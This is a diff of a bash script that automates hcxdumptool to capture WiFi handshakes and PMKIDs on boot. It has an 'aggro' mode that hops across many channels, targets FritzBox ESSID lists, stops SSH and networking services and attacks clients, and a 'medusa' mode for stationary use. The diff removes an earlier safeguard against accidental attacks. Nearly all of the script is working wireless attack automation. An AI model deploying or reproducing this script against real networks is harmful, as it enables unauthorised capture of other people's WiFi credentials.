@@ -1,76 +1,71 @@
 #!/usr/bin/env bash
 
-# ############################################ #
-# **************** CONFIG ******************** #
-stationary=			# leave empty
-capdir=/root/$(date +'%m-%d')/caps
+# ************* GLOBAL CONFIG ****************
+attempts=
 bpf=/root/0wn.bpf
-logfile=/root/autohcxdump.log
-ssidlst=/root/standard.essidliste
-
-# ************* walking speed ****************
-# attempts='--attemptapmax=1000 --attemptclientmax=50'
-chans='-c 1a,6a,11a,2a,1a,6a,11a,13a,1a,6a,11a,3a,1a,6a,11a,12a,1a,6a,11a,4a,1a,6a,11a,10a,1a,6a,11a,5a,1a,6a,11a,9a,1a,6a,11a,7a,1a,6a,11a,8a'
-staytime=
+logfile=/root/autohcxlab.log
+ssidlst=/root/fritzbox7590.essidliste
+# ssidlst=/root/fritzbox20.essidliste
 # ********************************************
 
-# # ************* driving speed ****************
-# attempts='--attemptapmax=10 --attemptclientmax=4'
-# chans=				# leave empty
-# staytime=
-# # ********************************************
-
-# # *********** stationary (home) **************
-# stationary=true			# disable ethernet check
-# attempts='--attemptclientmax=2'	# prevent attacking clients (in BPF) probing multiple APs
-# chans='-c 1a,3a,6a,5a,2a,7a,4a'	# depends on the channel of your AP (11 in this case)
-# staytime='-t 120'			# increasing stay time to 2mins
-# # ********************************************
-# ############################################## #
-
-exec &> >(tee -a $logfile)
 trap trapfunc SIGINT SIGTERM
-iw reg set DE > /dev/null
-
-sleep 10	# otherwise ethernet connection isn't detected reliably
+sleep 30
+printf '*==============================================================*\n%s    autohcxdump started\n' >> $logfile "$(date "+%m/%d %H:%M")"
+iw reg set DE >/dev/null
 
 check_ethernet()
 {
-	if [ "$(cat /sys/class/net/eth0/operstate)" == "up" ]; then
-	echo "[x]	Ethernet connected - Exiting!"
-	exit
-	fi
+        [ "$(cat /sys/class/net/eth0/operstate)" == "up" ] && {
+                printf '%s      Ethernet connected - Using stationary config\n' >> $logfile "$(date "+%m/%d %H:%M")"
+                medusa
+        }
+
+        [ "$(cat /sys/class/net/eth0/operstate)" == "down" ] && {
+                printf '%s      Ethernet disconnected - Using aggro config\n' >> $logfile "$(date "+%m/%d %H:%M")"
+                aggro
+        }
+}
+
+wait_iface()
+{
+        until ls -1 /sys/class/net | grep -q ^wl
+        do
+                sleep 10
+        done && printf '%s      iface found, writing %s\n' >> $logfile "$(date "+%m/%d %H:%M")" ${capname##*/}
 }
 
 trapfunc()
 {
-	[ -z $blinkpid ] || kill $blinkpid
-	echo "$(date "+%m/%d %H:%M")    autohcxdump stopped"
-	exit 0
+        [ -z $blinkpid ] || kill $blinkpid
+        printf '%s      autohcxdump stopped\n*==============================================================*\n' >> $logfile "$(date "+%m/%d %H:%M")"
+        exit 0
 }
 
-#	prevent accidental attacks
-[ -n "$stationary" ] || check_ethernet
+aggro()
+{
+        capname="/root/caps/aggro_$(date "+%m%d-%H%M%S").pcapng"
+        chans='1a,6a,11a,2a,1a,6a,11a,13a,1a,6a,11a,3a,1a,6a,11a,12a,1a,6a,11a,4a,1a,6a,11a,10a,1a,6a,11a,5a,1a,6a,11a,9a,1a,6a,11a,7a,1a,6a,11a,8a,1a,6a,11a,36b,1a,6a,11a,40b,1a,6a,11a,44b,1a,6a,11a,48b' # ZB config
+        # chans='48b,1a,6a,11a,2a,100b,1a,6a,11a,13a,1a,6a,11a,3a,1a,48b,6a,11a,12a,1a,36b,6a,11a,4a,1a,6a,11a,10a,1a,6a,11a,5a,48b,1a,6a,11a,9a,1a,6a,11a,7a,1a,6a,11a,8a,1a,6a,100b,1a,6a,11a,1a,6a,11a,36b,1a,6a,11a'
+        # chans='1a,6a,11a,2a,1a,6a,11a,13a,1a,6a,11a,3a,1a,6a,11a,12a,1a,6a,11a,4a,1a,6a,11a,10a,1a,6a,11a,5a,1a,6a,11a,9a,1a,6a,11a,7a,1a,6a,11a,8a'
+        attempts='--attemptapmax=0'
+        # attempts='--attemptapmax=6 --attemptclientmax=15' # +2 APs +5 STs
 
-echo '*===========================================================================*'
-echo "$(date "+%m/%d %H:%M")    autohcxdump started"
-echo 'Checking Iface'
+        wait_iface
+        systemctl stop sshd.service systemd-networkd.service systemd-resolved.service
+        gpio blink 7 & blinkpid=$! # Pulse LED to indicate aggro attack
+        hcxdumptool -A --bpf=$bpf --watchdogmax=60 --onwatchdog=reboot --onerror=reboot --errormax=20 --essidlist=$ssidlst $attempts -c $chans -w $capname
+        trapfunc
+}
 
-# 	looping until iface is found
-if ! ls -1 /sys/class/net | grep -q ^wl; then
-	echo "Looping until iface is found..."
-	until ls -1 /sys/class/net | grep -q ^wl
-	do
-		sleep 10
-	done
-fi
+medusa()
+{
+        capname="/root/caps/medusa_$(date "+%m%d-%H%M%S").pcapng"
+        chans='1a,8a,3a,6a,4a,7a,2a,5a'
+        attempts='--attemptapmax=0 --attemptclientmax=2'
 
-echo 'iface found, starting attack!'
-mkdir -p $capdir
-cd $capdir || echo "Couldn't cd into $capdir, using $(pwd)"
+        wait_iface
+        hcxdumptool -A --bpf=$bpf --onerror=reboot --errormax=20 --essidlist=$ssidlst $attempts -c $chans -w $capname
+        trapfunc
+}
 
-gpio blink 7 & 		# 	Pulse LED to indicate attack
-blinkpid=$!
-hcxdumptool -A --bpf=$bpf --watchdogmax=30 --onwatchdog=reboot --onerror=reboot --errormax=20 --essidlist=$ssidlst $attempts $chans $staytime
-
-[ -z $blinkpid ] || kill $blinkpid
+check_ethernet
